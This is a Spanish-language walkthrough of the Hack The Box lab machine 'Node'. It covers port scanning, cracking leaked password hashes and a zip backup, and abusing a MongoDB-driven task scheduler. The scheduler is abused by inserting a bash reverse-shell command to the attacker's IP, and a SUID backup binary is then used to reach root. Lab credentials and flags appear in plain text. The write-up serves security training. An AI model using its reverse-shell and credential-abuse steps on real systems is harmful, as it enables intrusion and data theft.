&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Node
❯ ls:w

 Node
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.58
PING 10.10.10.58 (10.10.10.58) 56(84) bytes of data.
64 bytes from 10.10.10.58: icmp_seq=1 ttl=63 time=109 ms

--- 10.10.10.58 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.550/108.550/108.550/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.58 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-17 22:25 GMT
Initiating SYN Stealth Scan at 22:25
Scanning 10.10.10.58 [65535 ports]
Discovered open port 22/tcp on 10.10.10.58
Discovered open port 3000/tcp on 10.10.10.58
Completed SYN Stealth Scan at 22:25, 26.41s elapsed (65535 total ports)
Nmap scan report for 10.10.10.58
Host is up, received user-set (0.11s latency).
Scanned at 2023-07-17 22:25:27 GMT for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 20 (880B)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,3000 10.10.10.58 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-17 22:26 GMT
Nmap scan report for 10.10.10.58
Host is up (0.12s latency).

PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
|_http-title: MyPlace
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.44 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.2p2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;hadoop-tasktracker&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.58:3000
http://10.10.10.58:3000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.10.58], JQuery, Script[text/javascript], Title[MyPlace], X-Powered-By[Express], X-UA-Compatible[IE=edge]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta nos reporta que se trata de un &lt;code&gt;Express&lt;/code&gt;, lo que quiere decir que en el backend esta corriendo &lt;code&gt;NodeJS&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a proceder a abrir el servicio con el navegador para visualizar el servicio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que existe una opcion de login para acceder al servicio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora ya que sabemos que por dentro corre un &lt;code&gt;nodejs&lt;/code&gt;, para evitar aplicar fuzzing, podemos usar el depurador, para poder ver rutas por defecto del servicio tipo &lt;code&gt;app&lt;/code&gt;. Y dentro descubrimos una ruta de usuarios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si tratamos de acceder a la ruta, vemos que podemos listar el contenido de usuarios con sus respectivas contraseñas hasheadas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Procedemos a crackear las contraseñas para ello usaremos nuestra web de confianza.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;y Obtenemos contraseñas en texto claro.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La exportamos al fichero de nombre &lt;code&gt;users.txt&lt;/code&gt; y procedemos a logearnos al servicio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat users.txt
myP14ceAdm1nAcc0uNT:manchester
tom:spongebob
mark:snowflake
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al conectarnos vemos una opción de &lt;code&gt;DownloadBackup&lt;/code&gt;, asi que lo descargamos y hacemos un decode del contenido que esta en &lt;code&gt;base64&lt;/code&gt; y lo exportamos con el nombre de &lt;code&gt;backup&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat myplace.backup | base64 -d &amp;gt; backup
❯ cat backup
❯ file backup
backup: Zip archive data, at least v1.0 to extract
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como resultado obtenemos un comprimido protegido por contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ unzip backup
Archive:  backup
   creating: var/www/myplace/
[backup] var/www/myplace/package-lock.json password
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Usaremos &lt;code&gt;fcrackzip&lt;/code&gt; y obtenemos la contraeña del comprimido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt backup


PASSWORD FOUND!!!!: pw == magicword
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dentro observamos bastante contenido, pero al tratarse de un &lt;code&gt;node.js&lt;/code&gt;, podemos tratar de grepear por archivos como &lt;code&gt;app.js&lt;/code&gt;, donde podemos encontrar informacion interesante.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ find . | grep app.js
./www/myplace/app.js
./www/myplace/static/assets/js/app/app.js
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Abrimos el archivo &lt;code&gt;app.js&lt;/code&gt; y encontramos unas credenciales del servicio mongodb, correspondientes al usuario &lt;code&gt;mark&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como vimos que el servicio &lt;code&gt;ssh&lt;/code&gt; se encuentra activo, podemos tratar de conectarnos con las nuevas credenciales.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3

              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Jul 18 00:34:52 2023 from 10.10.16.2
mark@node:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora que ganamos acceso al sistema como el usuario &lt;code&gt;mark&lt;/code&gt;, listamos los servicios activos y vemos el puerto &lt;code&gt;27017&lt;/code&gt;, correspondiente a &lt;code&gt;MongoDB&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mark@node:~$ ss -nltp
State       Recv-Q Send-Q                 Local Address:Port                    Peer Address:Port      
LISTEN      0      128                     127.0.0.1:27017                              *:*            
LISTEN      0      128                          *:22                                    *:*       
LISTEN      0      128                        :::3000                                   :::*           
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora listamos los procesos del sistema vemos que se esta corriendo otro &lt;code&gt;app.js&lt;/code&gt; correspondiente a un &lt;code&gt;scheduller&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mark@node:~$ ps -faux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    Jul17   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    Jul17   0:00  \_ [ksoftirqd/0]
mongodb   1237  0.6 11.8 281952 89772 ?        Ssl  Jul17   0:36 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
tom       1240  0.0  5.5 1008568 42148 ?       Ssl  Jul17   0:02 /usr/bin/node /var/scheduler/app.js
tom       1243  0.0  9.0 1041968 68560 ?       Ssl  Jul17   0:03 /usr/bin/node /var/www/myplace/app.js
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si visualizamos el archivo obtenemos otras credenciales correspondientes a mongo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;mark@node:~$ cat /var/scheduler/app.js
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;amp;authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error &amp;amp;&amp;amp; docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos conectamos la servicio con las nuevas credenciales obtenidas, listamos las colecciones de la base de datos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
&amp;gt; show collections
tasks
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En la colección &lt;code&gt;tasks&lt;/code&gt;, vamos a usar &lt;code&gt;db.task.find()&lt;/code&gt; tal y como vemos en el script &lt;code&gt;app.js&lt;/code&gt; para realizar consultas en la colección &lt;code&gt;tasks&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; db.tasks.find()
&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La consulta no nos lista nada, pero si volvemos a revisar &lt;code&gt;app.js&lt;/code&gt; obervamos &lt;code&gt;exec(doc.cmd);&lt;/code&gt; que se esta validando el uso de un campo llamado &lt;code&gt;cmd&lt;/code&gt;, asi que podriamos tratar de  insertar un nuevo documento con &lt;code&gt;db.tasks.insert()&lt;/code&gt; incorporando el &lt;code&gt;cmd&lt;/code&gt; y ejecutando un comando aprovechandonos de la función &lt;code&gt;exec&lt;/code&gt;y asi otorgarnos una &lt;code&gt;revershell&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;gt; db.tasks.insert({&quot;cmd&quot;: &quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.2/443 0&amp;gt;&amp;amp;1'&quot;})
WriteResult({ &quot;nInserted&quot; : 1 })
&amp;gt; db.tasks.find()
{ &quot;_id&quot; : ObjectId(&quot;64b5d7e418c6053c65dd5030&quot;), &quot;cmd&quot; : &quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.2/443 0&amp;gt;&amp;amp;1'&quot; }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora nos ponemos en escucha en nuestra equipo y recibimos la conexión como el usuario &lt;code&gt;tom&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.58.
Ncat: Connection from 10.10.10.58:44564.
bash: cannot set terminal process group (1240): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user &quot;root&quot;), use &quot;sudo &amp;lt;command&amp;gt;&quot;.
See &quot;man sudo_root&quot; for details.

tom@node:/$ whoami
whoami
tom
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podemos dirigirnos al directorio personal del usuario y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ cd /home/tom
cd /home/tom
tom@node:~$ cat user.txt
cat user.txt
4452fba153c742ca44fd79aac0f934c9
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Listando los binarios con privilegios &lt;code&gt;suid&lt;/code&gt;, encontramos uno inusual llamando &lt;code&gt;backup&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ find / -perm -4000 2&amp;gt;/dev/null
find / -perm -4000 2&amp;gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/local/bin/backup
/usr/bin/chfn
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/bin/ping
/bin/umount
/bin/fusermount
/bin/ping6
/bin/ntfs-3g
/bin/su
/bin/mount
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si tratamos de ejecutar el binario, vemos que no sucede nada.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ /usr/local/bin/backup
/usr/local/bin/backup
tom@node:/$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero si volvemos a visualizar el &lt;code&gt;app.js&lt;/code&gt; que listamos al principio el cual estaba contenido en el comprimido, observamos una ruta correspondiente a &lt;code&gt;backup&lt;/code&gt; la cual se ejecuta con 3 parametros, entre ellos una key y un directorio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probamos nuevamente a ejecutarlo con 3 parametros.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;om@node:/$ /usr/local/bin/backup a a a
/usr/local/bin/backup a a a



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [!] Ah-ah-ah! You didn't say the magic word!


tom@node:/$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que esta vez funciona, pero ahora usaremos ltrace para ver a bajo nivel el proceso de lo que sucede al ejecutar el binario.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ ltrace /usr/local/bin/backup a b c
ltrace /usr/local/bin/backup a b c
strncpy(0xffef6578, &quot;b&quot;, 100)                                                                                     = 0xffef6578
strcpy(0xffef6561, &quot;/&quot;)                                                                                           = 0xffef6561
strcpy(0xffef656d, &quot;/&quot;)                                                                                           = 0xffef656d
strcpy(0xffef64f7, &quot;/e&quot;)                                                                                          = 0xffef64f7
strcat(&quot;/e&quot;, &quot;tc&quot;)                                                                                                = &quot;/etc&quot;
strcat(&quot;/etc&quot;, &quot;/m&quot;)                                                                                              = &quot;/etc/m&quot;
strcat(&quot;/etc/m&quot;, &quot;yp&quot;)                                                                                            = &quot;/etc/myp&quot;
strcat(&quot;/etc/myp&quot;, &quot;la&quot;)                                                                                          = &quot;/etc/mypla&quot;
strcat(&quot;/etc/mypla&quot;, &quot;ce&quot;)                                                                                        = &quot;/etc/myplace&quot;
strcat(&quot;/etc/myplace&quot;, &quot;/k&quot;)                                                                                      = &quot;/etc/myplace/k&quot;
strcat(&quot;/etc/myplace/k&quot;, &quot;ey&quot;)                                                                                    = &quot;/etc/myplace/key&quot;
strcat(&quot;/etc/myplace/key&quot;, &quot;s&quot;)                                                                                   = &quot;/etc/myplace/keys&quot;
fopen(&quot;/etc/myplace/keys&quot;, &quot;r&quot;)                                                                                   = 0x8c06410
fgets(&quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;..., 1000, 0x8c06410)                                                     = 0xffef610f
strcspn(&quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;..., &quot;\n&quot;)                                                              = 64
strcmp(&quot;b&quot;, &quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;...)                                                                = 1
fgets(&quot;45fac180e9eee72f4fd2d9386ea7033e&quot;..., 1000, 0x8c06410)                                                     = 0xffef610f
strcspn(&quot;45fac180e9eee72f4fd2d9386ea7033e&quot;..., &quot;\n&quot;)                                                              = 64
strcmp(&quot;b&quot;, &quot;45fac180e9eee72f4fd2d9386ea7033e&quot;...)                                                                = 1
fgets(&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;..., 1000, 0x8c06410)                                                     = 0xffef610f
strcspn(&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;..., &quot;\n&quot;)                                                              = 64
strcmp(&quot;b&quot;, &quot;3de811f4ab2b7543eaf45df611c2dd25&quot;...)                                                                = 1
fgets(&quot;\n&quot;, 1000, 0x8c06410)                                                                                      = 0xffef610f
strcspn(&quot;\n&quot;, &quot;\n&quot;)                                                                                               = 0
strcmp(&quot;b&quot;, &quot;&quot;)                                                                                                   = 1
fgets(nil, 1000, 0x8c06410)                                                                                       = 0
strcpy(0xffef5148, &quot;Ah-ah-ah! You didn't say the mag&quot;...)                                                         = 0xffef5148
printf(&quot; %s[!]%s %s\n&quot;, &quot;\033[33m&quot;, &quot;\033[37m&quot;, &quot;Ah-ah-ah! You didn't say the mag&quot;... [!] Ah-ah-ah! You didn't say the magic word!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Observamos que compara el segundo campo &lt;code&gt;b&lt;/code&gt; con una key de un archivo &lt;code&gt;/etc/myplace/keys&lt;/code&gt; que si lo listamos podemos ver el contenido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ cat /etc/myplace/keys
cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos usar una de las keys y como tercer parametro ya que nos pide ingresar un directorio, podriamos tratar de visualizar la flag de root.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;/usr/local/bin/backup a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [+] Validated access token
 [+] Starting archiving root
 [+] Finished! Encoded backup is below:

UEsDBAoAAAAAAMRlEVUAAAAAAAAAAAAAAAAFABwAcm9vdC9VVAkAA//U/GKZ3bVkdXgLAAEEAAAAAAQAAAAAUEsDBBQACQAIANGDEUd/sK5kgwAAAJQAAAANABwAcm9vdC8ucHJvZmlsZVVUCQADGf7RVYbU/GJ1eAsAAQQAAAAABAAAAAC7S0BgR1Wijcf0zTfQzz2AUeUGjziY7U89PjPQsPty2Wod+yYRVD5R+tOsnM5XS/mYEGBvxfI+gHoSYXYIOVmbgVk0sGDudmBIKBmAHTd6CI7HwvmpdIYd55kKavmBD9dVP0zlDmMXKTCD7iExGYoocwQNLAKKVlywhpayl7ujYrnDclBLBwh/sK5kgwAAAJQAAABQSwMECgAAAAAAGYkQVQAAAAAAAAAAAAAAAAwAHAByb290Ly5jYWNoZS9VVAkAAxLB+2KZ3bVkdXgLAAEEAAAAAAQAAAAAUEsDBAoACQAAADR8I0sAAAAADAAAAAAAAAAgABwAcm9vdC8uY2FjaGUvbW90ZC5sZWdhbC1kaXNwbGF5ZWRVVAkAA8MSrFnDEqxZdXgLAAEEAAAAAAQAAAAALPb6trgTrqQGZ2KZUEsHCAAAAAAMAAAAAAAAAFBLAwQKAAkAAADsufFWj5GXdi0AAAAhAAAADQAcAHJvb3Qvcm9vdC50eHRVVAkAA3y9tWR8vbVkdXgLAAEEAAAAAAQAAAAAonAouj4BdrK7soKNNIpF+DuUY/UI/WEvjgdre7JExAU7PhllqJUy11nEsYDwUEsHCI+Rl3YtAAAAIQAAAFBLAwQUAAkACADrkVZHveUQPpsFAAAiDAAADAAcAHJvb3QvLmJhc2hyY1VUCQADqRkpVobU/GJ1eAsAAQQAAAAABAAAAABCkp2BZtn3fpEHkOgvu3RIbRuMhMPlhsYUNlOcNJckTyO1MzNXiBO6wMKKKVXnm1PanJU/DPSYRRuSutnp3/yF88GPXUvzTAf30d+LCuKdvlg78TrwpSXRDqCSPD0caOhwp3uW2tzfYiOHdXwYRjIJRzQxVET7l6FQBipAHIhN/QcuIUcXlTrRY5w6rqOL6YEPagB+6Iy4vvZwvQQ+S0pYuCHRcG6uoLoJ047ABuffJtaWYAxZl0ICbV3W8uuWOujagqMl8fjibTnBRIX4KztRSbHtu+/M4paoZZclZcUpH5o